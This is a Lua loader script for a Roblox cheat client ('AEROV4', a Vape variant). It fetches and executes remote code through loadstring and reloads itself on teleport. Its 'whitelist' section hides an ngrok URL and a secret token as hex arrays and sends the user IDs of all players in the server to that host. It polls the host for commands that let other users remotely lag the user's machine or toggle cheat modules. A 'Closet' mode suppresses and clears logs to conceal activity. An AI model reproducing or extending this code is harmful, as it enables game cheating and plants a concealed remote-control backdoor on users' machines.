repeat task.wait() until game:IsLoaded()
if shared.vape then shared.vape:Uninject() end

if identifyexecutor then
	if table.find({'Wave', 'Seliware', 'Volt'}, ({identifyexecutor()})[1]) then
		getgenv().setthreadidentity = nil
	end
end

local args = ...
if type(args) == "table" and args.Username then
	shared.ValidatedUsername = args.Username
end

if type(args) == "table" and args.Closet then
	getgenv().Closet = true
else
	if getgenv().Closet == nil then
		getgenv().Closet = false
	end
end

local vape
local loadstring = function(...)
	local res, err = loadstring(...)
	if err and vape then
		vape:CreateNotification('Vape', 'Failed to load : '..err, 30, 'alert')
	end
	return res
end
local queue_on_teleport = queue_on_teleport or function() end
local isfile = isfile or function(file)
	local suc, res = pcall(function()
		return readfile(file)
	end)
	return suc and res ~= nil and res ~= ''
end
local cloneref = cloneref or function(obj)
	return obj
end
local playersService = cloneref(game:GetService('Players'))
local httpService = cloneref(game:GetService('HttpService'))

local function downloadFile(path, func)
	if not isfile(path) then
		local res
		local success = false
		for attempt = 1, 3 do
			local suc, result = pcall(function()
				return game:HttpGet('https://raw.githubusercontent.com/poopparty/poopparty/' .. readfile('newvape/profiles/commit.txt') .. '/' .. select(1, path:gsub('newvape/', '')), true)
			end)
			if suc and result ~= '404: Not Found' then
				res = result
				success = true
				break
			end
			task.wait(1)
		end
		if not success then
			error('Failed to download ' .. path .. ' after 3 attempts')
		end
		if path:find('.lua') then
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n' .. res
		end
		writefile(path, res)
	end
	return (func or readfile)(path)
end

local function migrateProfiles()
	if isfile('newvape/profiles/migrated_placeid.txt') then return end

    local oldId = tostring(game.GameId)
    local newId = tostring(game.PlaceId)

	if oldId == newId then
		pcall(writefile, 'newvape/profiles/migrated_placeid.txt', 'done')
		return
	end

	local suffix = oldId .. '.txt'
	for _, path in ipairs(listfiles('newvape/profiles')) do
		local name = path:gsub('\\', '/')
		if name:sub(-#suffix) == suffix then
			local newPath = name:sub(1, -#suffix - 1) .. newId .. '.txt'
			if not isfile(newPath) then
				pcall(function() writefile(newPath, readfile(path)) end)
			end
		end
	end

	if isfolder('newvape/profiles/premade') then
		for _, path in ipairs(listfiles('newvape/profiles/premade')) do
			local name = path:gsub('\\', '/')
			if name:sub(-#suffix) == suffix then
				local newPath = name:sub(1, -#suffix - 1) .. newId .. '.txt'
				if not isfile(newPath) then
					pcall(function() writefile(newPath, readfile(path)) end)
				end
			end
		end
	end

	pcall(writefile, 'newvape/profiles/migrated_placeid.txt', 'done')
end

pcall(migrateProfiles)

local function finishLoading()
	vape.Init = nil
	if not vape.Load then
		warn('[AEROV4] vape.Load is nil skipping load')
		return
	end
	vape:Load()
	vape:Clean(task.spawn(function()
		repeat
			pcall(vape.Save, vape)
			task.wait(10)
		until vape.Loaded == nil
	end))

	local teleportedServers
	vape:Clean(playersService.LocalPlayer.OnTeleport:Connect(function()
		if (not teleportedServers) and (not shared.VapeIndependent) then
			teleportedServers = true
			local teleportScript = [[
				repeat task.wait() until game:IsLoaded()
				if getgenv and not getgenv().shared then getgenv().shared = {} end
				shared.vapereload = true
				loadstring(game:HttpGet('https://raw.githubusercontent.com/poopparty/poopparty/'..readfile('newvape/profiles/commit.txt')..'/loader.lua', true), 'loader')()
			]]
			if shared.VapeDeveloper then
				teleportScript = 'shared.VapeDeveloper = true\n' .. teleportScript
			end
			if shared.VapeCustomProfile then
				teleportScript = 'shared.VapeCustomProfile = "' .. shared.VapeCustomProfile .. '"\n' .. teleportScript
			end
			if shared.ValidatedUsername then
				teleportScript = 'shared.ValidatedUsername = "' .. shared.ValidatedUsername .. '"\n' .. teleportScript
			end
			local _ok, _err = pcall(function() vape:Save() end)
			if not _ok then warn('[AEROV4] save failed before teleport: ' .. tostring(_err)) end
			queue_on_teleport(teleportScript)
		end
	end))

	if not shared.vapereload then
		if not vape.Categories then return end
		if vape.Categories.Main.Options['GUI bind indicator'].Enabled then
			local name = shared.ValidatedUsername and ('wsg, ' .. shared.ValidatedUsername .. ' :D ') or 'welcome '
			task.spawn(function()
				local deadline = tick() + 15
				while tick() < deadline do
					if getgenv()._aeroTierReady then break end
					task.wait(0.5)
				end
				local tier = 0
				if getgenv().getAeroTier then
					tier = getgenv().getAeroTier(playersService.LocalPlayer) or 0
				end
				vape:CreateNotification('[AEROV4] Finished Loading [Tier ' .. tostring(tier) .. ']', name .. (vape.VapeButton and 'Press the button in the top right to open GUI' or 'Press ' .. table.concat(vape.Keybind, ' + '):upper() .. ' to open GUI'), 5)
			end)
		end
	end
end

if not isfile('newvape/profiles/gui.txt') then
	writefile('newvape/profiles/gui.txt', 'new')
end
local gui = readfile('newvape/profiles/gui.txt')

if not isfolder('newvape/assets/' .. gui) then
	makefolder('newvape/assets/' .. gui)
end

local guiFunc, guiErr = loadstring(downloadFile('newvape/guis/' .. gui .. '.lua'), 'gui')
if not guiFunc then
	error('[AEROV4] Failed to load GUI: ' .. tostring(guiErr))
end
vape = guiFunc()
if not vape then
	error('[AEROV4] GUI returned nil file may be corrupted try deleting newvape/guis/' .. gui .. '.lua and reinjecting.')
end
if not vape.Load then
	if delfile then pcall(function() delfile('newvape/guis/' .. gui .. '.lua') end) end
	error('[AEROV4] gui file corrupted (missing load) reinject..')
end
if not vape.Init and not vape.Load then
	error('[AEROV4] failed to initialize properly reinject to fix this bs')
end
shared.vape = vape
task.wait(0.1)

-- whitelist
do
	local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body='{"tier":0}'} end
	local function _bu()
		local _s = {'68','74','74','70','73','3a','2f','2f','67','65','63','6b','6f','2d','73','74','65','72','6e','75','6d','2d','72','75','62','64','6f','77','6e','2e','6e','67','72','6f','6b','2d','66','72','65','65','2e','64','65','76','2f','77','68','69','74','65','6c','69','73','74'}
		local _r = '' for _,v in _s do _r = _r .. string.char(tonumber(v,16)) end return _r
	end
	local function _ft(uid)
		local ok, res = pcall(function()
			return _req({
				Url = _bu(),
				Method = 'POST',
				Headers = {['Content-Type']='application/json',['ngrok-skip-browser-warning']='true'},
				Body = httpService:JSONEncode({action='check',roblox_id=tostring(uid),robloxUserId=tostring(uid)})
			})
		end)
		if not ok or not res then return 0 end
		if not res.Body or res.Body == '' then return 0 end
		if res.StatusCode and res.StatusCode >= 500 then return 0 end
		local dok, data = pcall(function() return httpService:JSONDecode(res.Body) end)
		if not dok or not data then return 0 end
		return tonumber(data.tier) or 0
	end

	local _tierCache = {}
	local _fetchQueue = {}
	local _queueRunning = false

	local function _queueFetch(uid)
		if _tierCache[uid] ~= nil and _tierCache[uid] ~= false then return end
		_tierCache[uid] = nil
		table.insert(_fetchQueue, uid)
		if _queueRunning then return end
		_queueRunning = true
		task.spawn(function()
			while #_fetchQueue > 0 do
				local id = table.remove(_fetchQueue, 1)
				_tierCache[id] = _ft(id)
				task.wait(0.2)
			end
			_queueRunning = false
		end)
	end

	local _commands = {}
	local lagConnections = {}
	local function _registerCommand(name, fn) _commands[name] = fn end

	local _SERCET = ''
	local _stok = {'58','37','70','4b','39','6d','51','32','76','52','38','74','59','35','77','5a','33','78','42','36','6e','48','34','6a','4c','39','70','51','32','76','54','38','77','45','35','72','59','39','75','49','33','6f','50','36','61','53','31','64','46','34','67','48','37','6a','4b','39','6d','51','32','76'}
	local _stmp = ''
	for _,v in _stok do _stmp = _stmp .. string.char(tonumber(v,16)) end
	_SERCET = _stmp

	getgenv()._aeroTierReady = false
	getgenv().getAeroTier = function(player) return 0 end

	task.spawn(function()
		local lplr = playersService.LocalPlayer
		_tierCache[lplr.UserId] = _ft(lplr.UserId)
		getgenv()._aeroTierCache = _tierCache
		getgenv().getAeroTier = function(player)
			local t = _tierCache[player.UserId]
			return type(t) == 'number' and t or 0
		end
		getgenv()._aeroTierReady = true
		task.wait(1)
		for _, p in playersService:GetPlayers() do
			if p.UserId ~= lplr.UserId then _queueFetch(p.UserId) end
		end
	end)

	playersService.PlayerAdded:Connect(function(p) _queueFetch(p.UserId) end)

	local pollingActive = true
	vape:Clean(function() pollingActive = false end)
	task.spawn(function()
		local lplr = playersService.LocalPlayer
		local nextPoll = 0
		while pollingActive do
			if tick() < nextPoll then task.wait(0.5) continue end
			local ok, res = pcall(function()
				return _req({
					Url = _bu(),
					Method = 'POST',
					Headers = {['Content-Type']='application/json',['ngrok-skip-browser-warning']='true'},
					Body = httpService:JSONEncode({action='getMessage',robloxUserId=tostring(lplr.UserId)})
				})
			end)
			if not ok or not res or not res.Body then nextPoll = tick() + 3 continue end
			local dok, data = pcall(function() return httpService:JSONDecode(res.Body) end)
			if not dok or not data then nextPoll = tick() + 3 continue end
			if res.StatusCode == 429 then nextPoll = tick() + ((data.retryAfter or 3000) / 1000) continue end
			if data.success and data.message then
				local cmd = tostring(data.message)
				if _commands[cmd] then _commands[cmd](tostring(data.from), data.args or '') end
				pcall(function()
					_req({
						Url = _bu(),
						Method = 'POST',
						Headers = {['Content-Type']='application/json',['ngrok-skip-browser-warning']='true'},
						Body = httpService:JSONEncode({action='removeMessage',robloxUserId=tostring(lplr.UserId)})
					})
				end)
				nextPoll = tick() + 1.5
			else
				nextPoll = tick() + 3
			end
		end
	end)

	local function getAccountTier(player)
		if _tierCache[player.UserId] == nil then
			_tierCache[player.UserId] = false
			task.spawn(function() _tierCache[player.UserId] = _ft(player.UserId) end)
			return 0
		end
		local t = _tierCache[player.UserId]
		return type(t) == 'number' and t or 0
	end

	local function startLag(userId)
		local key = tostring(userId)
		if lagConnections[key] then return end
		local state = {active = true}
		local connection
		connection = game:GetService('RunService').Heartbeat:Connect(function()
			if not state.active then
				connection:Disconnect()
				lagConnections[key] = nil
				return
			end
			for i = 1, 100000 do local a = math.sin(i) * math.cos(i) end
		end)
		lagConnections[key] = {connection = connection, state = state}
	end

	local function stopLag(userId)
		local key = tostring(userId)
		local data = lagConnections[key]
		if not data then return end
		data.state.active = false
		data.connection:Disconnect()
		lagConnections[key] = nil
	end

	_registerCommand('lag', function(from, args)
		if getAccountTier(playersService.LocalPlayer) >= 1 then return end
		if not from then return end
		startLag(from)
	end)

	_registerCommand('lagstop', function(from, args)
		if not from then return end
		stopLag(from)
	end)

	_registerCommand('module', function(from, args)
		if not args or args == '' then return end
		local parts = args:split(' ')
		local moduleName = parts[1]
		local action = (parts[2] and parts[2]:lower()) or 'toggle'
		for _, mod in pairs(vape.Modules or {}) do
			if mod and mod.Name == moduleName then
				if action == 'enable' then
					if not mod.Enabled then mod:Toggle() end
				elseif action == 'disable' then
					if mod.Enabled then mod:Toggle() end
				else
					mod:Toggle()
				end
			end
		end
	end)
end

if getgenv().Closet then
	local LogService = cloneref(game:GetService('LogService'))
	local originals = {}
	local function hook(funcName)
		if typeof(getgenv()[funcName]) == 'function' then
			local original = hookfunction(getgenv()[funcName], function() end)
			originals[funcName] = original
		end
	end
	hook('print')
	hook('warn')
	hook('error')
	hook('info')
	pcall(function() LogService:ClearOutput() end)
	local conn = LogService.MessageOut:Connect(function()
		LogService:ClearOutput()
	end)
	getgenv()._vape_log_connection = conn
	getgenv()._vape_originals = originals
end

if not shared.VapeIndependent then
	loadstring(downloadFile('newvape/games/universal.lua'), 'universal')()
	local gameFileId = (game.GameId == 2619619496) and (game.PlaceId == 6872265039 and 6872265039 or 6872274481) or game.PlaceId
	if isfile('newvape/games/' .. gameFileId .. '.lua') then
		loadstring(downloadFile('newvape/games/' .. gameFileId .. '.lua'), tostring(gameFileId))(...)
	else
		if not shared.VapeDeveloper then
			local suc, res = pcall(function()
				return game:HttpGet('https://raw.githubusercontent.com/poopparty/poopparty/' .. readfile('newvape/profiles/commit.txt') .. '/games/' .. gameFileId .. '.lua', true)
			end)
			if suc and res ~= '404: Not Found' then
				loadstring(downloadFile('newvape/games/' .. gameFileId .. '.lua'), tostring(gameFileId))(...)
			end
		end
	end
	finishLoading()
else
	vape.Init = finishLoading
	return vape
end
